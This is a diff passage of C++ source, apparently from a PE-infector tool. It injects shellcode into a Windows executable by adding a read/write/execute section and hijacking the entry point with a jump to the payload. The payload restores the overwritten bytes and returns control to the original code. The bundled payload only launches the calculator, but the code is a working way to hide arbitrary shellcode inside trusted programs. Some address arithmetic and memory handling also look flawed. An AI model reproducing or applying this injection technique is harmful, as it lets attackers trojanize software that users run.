+                                              image_NT_header_ptr,index_of_payload_section);
+    error_warning_message_box(status);
+
+    //storing the whole .payload section inside the payload_section_header_ptr
+    this->payload_section_header_ptr = image_section_header_vec[index_of_payload_section];
+
+    //gets the index corresponding to the radio button
+    int chosen_payload_index = get_payload_radio_button();
+
+
+    switch(chosen_payload_index)
+    {
+        case 0:
+            set_morphed_exe_name(exe_file_path,"_CALC");
+            this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
+            break;
+
+        default:
+            break;
+    }
+
+    //setting the full file path
+    set_morphed_exe_file_path(exe_file_path);
+
+    //calculate the file alignment factor to align the section
+    calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);
+
+    //calculate the payload raw data size via file_alignment
+    this->payload_raw_data_size = this->file_alignment_factor * this->file_alignment;
+
+    //calculate the section alignment factor for the section
+    //needs the virtual size of the section before the payload section for calculation
+    calculate_section_alignment_factor(payload_num_of_bytes,section_alignment,section_alignment_factor,
+                                       image_section_header_vec[index_of_payload_section-1]);
+
+    //calculate payloads virtual size via section alignment
+    this->payload_virtual_size = this->section_alignment_factor * this->section_alignment;
+
+    //calculate payloads raw address
+    //previous raw size + previous raw data offset
+    this->payload_raw_address = image_section_header_vec[index_of_payload_section-1]->SizeOfRawData
+                                + image_section_header_vec[index_of_payload_section-1]->PointerToRawData;
+
+    //calculate the payloads va
+    //previous virtual address + payloads virtual size
+    this->payload_virtual_address = image_section_header_vec[index_of_payload_section-1]->VirtualAddress
+                                    + this->payload_virtual_size;
+
+    //setting the relevant values in the new payload section header via payload_section_header_ptr
+    init_payload_section_header(this->payload_section_header_ptr,
+                                this->payload_raw_address,
+                                this->payload_raw_data_size,
+                                this->payload_virtual_address,
+                                this->payload_virtual_size,
+                                this->SECTIONCHARACTERISTICSTOSET);
+
+    //setting the new size of the pe file
+    //via image_NT_header_ptr by adding on the payload_virtual_size
+    this->image_NT_header_ptr->OptionalHeader.SizeOfImage += this->payload_virtual_size;
+
+    //this is the section pivot gadget for the payload section,
+    //which is used to patch back the .text section
+    //currently this value is when the PE is loaded, hence we add the raw data offset of the text section
+    this->starting_of_text_section_offset_on_load = this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint -
+                                    this->image_NT_header_ptr->OptionalHeader.BaseOfCode +
+                                    this->text_section_raw_data_offset;
+
+    //getting image base via image_NT_header_ptr optional header
+    this->image_base = this->image_NT_header_ptr->OptionalHeader.ImageBase;
+
+    //getting the start of the payload section, which is image base + payload virtual size
+    this->start_of_payload_section_offset = this->image_base + this->payload_virtual_address;
+
+    //writing assembly syntax, for jumping to payload section (section pivot gadget), into string
+    std::string jump_to_payload_asm = "mov ecx, ";
+    jump_to_payload_asm += convert_num_to_hex<DWORD>(this->start_of_payload_section_offset) + ";";
+    jump_to_payload_asm += "jmp ecx;";
+    this->machine_code_vec.clear(); //clear vector to input new machine code
+
+    //and converting assembly syntax into machine code
+    status = asm_to_machine_code(jump_to_payload_asm,this->machine_code_vec,this->machine_code_num_of_bytes);
+    error_warning_message_box(status);
+
+    //storing the byte length of the section pivot gadget
+    this->jump_to_payload_byte_length = this->machine_code_num_of_bytes;
+
+    //putting original text section data into a pointer, to be added into the buffer later
+    this->text_section_buffer_original = get_section_data_from_buffer(this->buffer,
+                                                                      this->text_section_raw_data_offset,
+                                                                      this->size_of_text_section);
+    //storing the original text section into a pointer, for calculation
+    this->text_section_buffer_ptr = this->text_section_buffer_original;
+
+
+    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
+    //will be used to put into the actual buffer later
+    //starting_of_text_section_offset_on_load must subtract by the text_section_raw_data_offset
+    //to get to the physical memory of the buffer
+    editing_text_section_ptr(this->text_section_buffer_ptr,
+                             this->jump_to_payload_byte_length,
+                             this->starting_of_text_section_offset_on_load - this->text_section_raw_data_offset,
+                             this->machine_code_vec);
+
+
+    //stores the payload into a variable char* and the ptr is to do calculation
+    char *payload_section_buffer_original = new char [this->payload_raw_data_size];
+    char *payload_section_buffer_ptr = payload_section_buffer_original;
+
+    //we need to store the payload entry point address into edi, so that stosd will work as intended
+    //safe practice, incase edi was used or modified previously
+    std::string store_payload_entry_point_in_edi_asm = "";
+    store_edi(store_payload_entry_point_in_edi_asm,this->entry_point_of_text_section);
+    this->machine_code_vec.clear();
+    asm_to_machine_code(store_payload_entry_point_in_edi_asm,
+                        this->machine_code_vec,this->machine_code_num_of_bytes);
+
+    populate_section_ptr(payload_section_buffer_ptr,
+                                reinterpret_cast<char*>(this->machine_code_vec.data()),
+                                this->machine_code_num_of_bytes);
+
+
+    //here we memorize the original bytes of the text section
+    //this will be used in the payload section to patch back the overwritten text section bytes
+    std::string text_section_memorized_entry_bytes = "";
+
+    //stosd can only store a certain amount of dwords
+    //this is to calculate how many stosd we need
+    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
+    calculate_num_of_stosd_for_patching(text_section_memorized_entry_bytes,
+                                        this->num_of_stosd,
+                                        this->jump_to_payload_byte_length,
+                                        this->starting_of_text_section_offset_on_load,
+                                        this->buffer);
+
+
+
+    //getting the stosd instructions asm, afew calculations must be done for big to little endian conversion
+    std::string patching_entry_bytes_asm = "";
+    get_stosd_instruction_asm(patching_entry_bytes_asm,
+                              text_section_memorized_entry_bytes,
+                              this->num_of_stosd);
+
+    //converting patching_entry_bytes_asm to machine code
+    this->machine_code_vec.clear();
+    asm_to_machine_code(patching_entry_bytes_asm,this->machine_code_vec,
+                        this->machine_code_num_of_bytes);
+
+
+    //writing the machine code into payload_section_buffer_ptr
+    //this will be used later to write back to the buffer
+    populate_section_ptr(payload_section_buffer_ptr,
+                                reinterpret_cast<char*>(this->machine_code_vec.data()),
+                                this->machine_code_num_of_bytes);
+
+    //putting in the payload into payload_section_buffer_ptr
+    populate_section_ptr(payload_section_buffer_ptr,
+                         reinterpret_cast<char*>(this->payload_vec.data()),
+                         this->payload_num_of_bytes);
+
+    //getting the asm instructions to jump back to the text section
+    std::string jump_back_to_text_section_asm = "";
+    get_jump_back_to_text_section_instruction_asm(jump_back_to_text_section_asm
+                                                  ,this->entry_point_of_text_section);
+
+    //converting the above asm instructions to machine code
+    machine_code_vec.clear();
+    asm_to_machine_code(jump_back_to_text_section_asm,this->machine_code_vec,
+                        this->machine_code_num_of_bytes);
+
+    //putting in the jump back to text section into payload_section_buffer_ptr
+    populate_section_ptr(payload_section_buffer_ptr,
+                         reinterpret_cast<char*>(this->machine_code_vec.data()),
+                         this->machine_code_num_of_bytes);
+
+
+
+    //===================================================================================
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->dos_header_pointer,
+                            this->buffer_cursor,sizeof(IMAGE_DOS_HEADER));
+    //replacing back the edited image_NT_header_ptr into the buffer
+    //number of sections was increased by 1
+    //new size of the pe file was set
+    //by adding the payload_virtual_size to SizeOfImage
+    this->buffer_cursor = this->exe_header_file_offset;
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->image_NT_header_ptr,
+                            this->buffer_cursor,sizeof(IMAGE_NT_HEADERS32));
+
+    //need to be used to find the payload section later
+    unsigned int start_of_section_headers_offset = this->buffer_cursor + sizeof(IMAGE_NT_HEADERS32);
+
+    //need to add the cursor + the size of IMAGE_NT_HEADERS32 + the index_of_text_section * size of IMAGE_SECTION_HEADER
+    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER));
+    //this->buffer_cursor += this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER);
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_header_ptr,
+                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));
+
+    //putting in the new payload section header
+    //payload raw address is previous raw size + previous raw data offset
+    //payload raw data size was calculated via file_alignment
+    //payload virtual size is calculated via section alignment
+    //payload virtual address is previous virtual address + payloads virtual size
+    //payload characteristics is set to read/write/execute
+    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_payload_section * sizeof(IMAGE_SECTION_HEADER));
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->payload_section_header_ptr,
+                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));
+
+    //need to resize buffer to accomodate the new payload section
+    __int64 new_buffer_size = this->buffer.size() + this->payload_raw_data_size;
+    this->buffer.resize(new_buffer_size);
+
+    //start at the payload_section_header_ptr pointer to raw data
+    //putting in the payload into buffer
+    this->buffer_cursor = this->payload_section_header_ptr->PointerToRawData;
+    rewrite_bytes_to_buffer(this->buffer, (char*)payload_section_buffer_original,
+                            this->buffer_cursor,this->payload_raw_data_size);
+
+    this->buffer_cursor = this->text_section_raw_data_offset;
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_buffer_original,
+                            this->buffer_cursor,this->size_of_text_section);
+
+
+     print_section_headers(image_section_header_vec);
+    //writing to file
+    write_exe_file(this->morphed_exe_file_path, this->buffer);
+    //free memory
+    delete[] payload_section_buffer_original;
+    payload_section_buffer_ptr = nullptr;
+    delete payload_section_buffer_ptr;
+
+    std::cout << std::endl;
+
+    return SUCCESS_MORPHED_EXECUTABLE;
 }
